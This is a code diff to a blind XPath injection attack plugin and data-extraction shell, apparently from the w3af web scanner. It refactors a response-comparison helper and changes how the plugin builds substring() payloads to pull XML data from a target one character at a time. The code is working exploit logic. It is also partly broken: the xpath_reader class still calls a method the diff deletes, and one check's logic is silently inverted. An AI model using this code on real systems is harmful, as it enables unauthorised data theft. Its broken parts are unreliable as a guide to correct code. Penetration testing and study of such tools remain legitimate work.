@@ -34,7 +34,7 @@ from core.data.kb.exec_shell import shell as shell
 
 ERROR_MSG = 'Empty Path Expression'
 XML_FILTER = '//*'
-
+THRESHOLD = 0.8
 
 
 class xpath(baseAttackPlugin):
@@ -50,8 +50,7 @@ class xpath(baseAttackPlugin):
         self._method = 'GET'
     
         # Internal variables
-        self.use_difflib = None
-        self.THRESHOLD = 0.8
+        self.use_difflib = None        
         self.rnum = randint(1,100)
 
     def fastExploit( self ):
@@ -163,7 +162,7 @@ class xpath(baseAttackPlugin):
         except w3afException, e:
             return 'Error "' + str(e) + '"'
         else:
-            if not self._response_is_error(vuln, false_resp.getBody()):  
+            if not response_is_error(vuln, false_resp.getBody(), self._urlOpener, self.use_difflib):  
                 om.out.debug( "ERROR: Error message not found in FALSE response..." )
                 return False
             else:
@@ -180,7 +179,7 @@ class xpath(baseAttackPlugin):
             except w3afException, e:
                 return 'Error "' + str(e)
             else:              
-                if self. _response_is_error(vuln, true_resp.getBody()):
+                if response_is_error(vuln, true_resp.getBody(), self._urlOpener, self.use_difflib):
                     print true_resp.getBody()
                     om.out.debug( "ERROR: Error message found in TRUE response..." )
                     return False
@@ -207,20 +206,20 @@ class xpath(baseAttackPlugin):
         try:
             sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
         except w3afException, e:
-            om.out.debug( 'Error "' + str(e) + '"' )
+            om.out.debug( 'Error "%s"' % (e) )
             return None
         else:
-            if self._response_is_error(vuln, sq_resp.getBody()):
+            if response_is_error(vuln, sq_resp.getBody(), self._urlOpener, self.use_difflib):
                 # If we found ERROR with TRUE Query, we have a problem!
                 om.out.debug( 'Single quote TRUE test failed, testing double quote' )
                 exploit_dc[ vuln.getVar() ] = true_dq
                 try:
                     dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
-                    om.out.debug( 'Error "' + str(e) + '"' )
+                    om.out.debug( 'Error "%s"' % (e) )
                     return None
                 else:
-                    if self._response_is_error(vuln, dq_resp.getBody()):
+                    if response_is_error(vuln, dq_resp.getBody(), self._urlOpener, self.use_difflib):
                         # If we found an error HERE, the TWO tests were ERROR, 
                         # Houston we have a BIG PROBLEM! 
                         om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
@@ -234,45 +233,16 @@ class xpath(baseAttackPlugin):
                 try:
                     sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
-                    om.out.debug( 'Error "' + str(e) + '"' )
+                    om.out.debug( 'Error "%s"' % (e) )
                     return None
                 else:
-                    if self._response_is_error(vuln, sq_resp.getBody()):
+                    if response_is_error(vuln, sq_resp.getBody(), self._urlOpener, self.use_difflib):
                         om.out.debug( 'String delimiter FOUND, it is (\')!' )
                         return "'"
                     else:
                         om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
                         return None         
-    
-    #TODO: This is duplicated code                 
-    def _response_is_error(self, vuln, res_body):
-        '''
-        This functions checks which method must be used to check Responses
-        
-        @return: True if the res_body is ERROR and FALSE if Not
-        '''
-        exploit_dc = vuln.getDc()
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
-        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
-
-        if self.use_difflib:
-            # TODO: Perform this request only once
-            try:     
-                baseReq = functionReference( vuln.getURL(), str(exploit_dc) )
-            except w3afException, e:
-                # TODO: FIX this return
-                return 'Error "' + str(e) + '"'
-            else:
-                if difflib.SequenceMatcher(None, baseReq.getBody(), 
-                                           res_body).ratio() < self.THRESHOLD :
-                    return True
-                else:
-                    return False
-        else:
-            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
-                return True
-            else:
-                return False
+                     
 
 
     def _verifyDifflib(self, vuln, count):
@@ -298,11 +268,11 @@ class xpath(baseAttackPlugin):
                                                     req_x.getBody()).ratio()
                                                                          
         except w3afException, e:
-            om.out.debug( 'Error "' + str(e) + '"' )
+            om.out.debug( 'Error "%s"' % (e) )
         else:
             om.out.debug( 'Test finished!' )
             
-            if (diffRatio / count) > self.THRESHOLD:
+            if (diffRatio / count) > THRESHOLD:
                 om.out.debug( 'It is possible use difflib for identifying the error response' )
                 return True
             else:
@@ -371,7 +341,7 @@ class xpath_reader(shell):
             try:
                 data = self.get_data(data_len)
             except w3afException:
-                om.out.debug( 'Error found during data extration: "%s"' % w3afException )
+                om.out.debug( 'Error found during data extraction: "%s"' % w3afException )
                 return ''
             else:
                 return data
@@ -404,9 +374,9 @@ class xpath_reader(shell):
             try:    
                 lresp = functionReference( self.getURL(), str(exploit_dc) )
             except w3afException, e:
-                om.out.debug( 'Error "' + str(e) + '"' )
+                om.out.debug( 'Error "%s"' % (e) )
             else:
-                if not self._response_is_error(self, lresp.getBody()):
+                if response_is_error(self, lresp.getBody(), self._urlOpener, self.use_difflib):
                     # We found the length!
                     fdata_len = True
                     om.out.debug('Response Length FOUND!: %i ' % (mid) )
@@ -427,17 +397,14 @@ class xpath_reader(shell):
                     else:
                         if not self._response_is_error(self, lresp.getBody()):
                             # LENGTH IS < THAN MID
-                            #print 'Len < %i' % (mid)
                             maxl = mid
                         else:
                             # LENGTH IS > THAN MID
-                            #print 'Len > %i' % (mid)
                             minl = mid
 
     def get_data(self, ldata):
         '''
         @param ldata: The data length to retrieve
-        
         @return: A string with the XML data!
         
         HTTP library exceptions are not handled in order to make the code clearer. 
@@ -453,7 +420,7 @@ class xpath_reader(shell):
                 #TODO: I'm missing the original value. See the 1 at the string start
                 #TODO: Find a better solution for self.TRUE_COND[3:]
                 
-                hexcar = '%' + hex(c)[2:]
+                hexcar = chr(c)
                 dataq = '1%s and substring(%s,%i,1)="%s" %s' % (self.STR_DEL,
                                                                XML_FILTER, 
                                                                pos, hexcar, 
@@ -462,8 +429,11 @@ class xpath_reader(shell):
                 dresp = functionReference( self.getURL(), str(exploit_dc) )
                 
                 if not self._response_is_error(self, dresp.getBody()):
-                    om.out.console('Character found: %s' % c)
-                    data += chr(c)
+                    om.out.console('Character found: "%s"' % hexcar )
+                    data += hexcar
+                    break
+            else:
+                om.out.console('Character NOT found!')
                     
         return data
             
@@ -473,32 +443,38 @@ class xpath_reader(shell):
     def getName( self ):
         return 'xpath_reader'
         
-    #TODO: This is duplicated code                 
-    def _response_is_error(self, vuln, res_body):
-        '''
-        This functions checks which method must be used to check Responses
-        
-        @return: True if the res_body is ERROR and FALSE if Not
-        '''
-        exploit_dc = vuln.getDc()
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
-        exploit_dc[ vuln.getVar() ] = '1'#TODO: vuln.getMutant().getOriginalValue()
 
-        if self.use_difflib:
-            # TODO: Perform this request only once
-            try:     
-                baseReq = functionReference( vuln.getURL(), str(exploit_dc) )
-            except w3afException, e:
-                # TODO: FIX this return
-                return 'Error "' + str(e) + '"'
-            else:
-                if difflib.SequenceMatcher(None, baseReq.getBody(), 
-                                           res_body).ratio() < self.THRESHOLD :
-                    return True
-                else:
-                    return False
+#
+#    Helper functions
+#
+def response_is_error(vuln, res_body, url_opener, use_difflib=True):
+    '''
+    This functions checks which method must be used to check Responses
+    
+    @return: True if the res_body is ERROR and FALSE if Not
+    '''
+    if use_difflib:
+        exploit_dc = vuln.getDc()
+        functionReference = getattr( url_opener , vuln.getMethod() )
+
+        # TODO: This does NOT work for some reason.
+        #    'vuln' object has no attribute 'getOriginalValue'
+        #exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
+
+        # TODO: Perform this request only once
+        try:
+            base_req = functionReference( vuln.getURL(), str(exploit_dc) )
+        except w3afException, e:
+            # TODO: FIX this return
+            return 'Error "' + str(e) + '"'
         else:
-            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
+            if difflib.SequenceMatcher(None, base_req.getBody(), 
+                                       res_body).ratio() < THRESHOLD :
                 return True
             else:
                 return False
+    else:
+        if re.search(ERROR_MSG, res_body, re.IGNORECASE):
+            return True
+        else:
+            return False
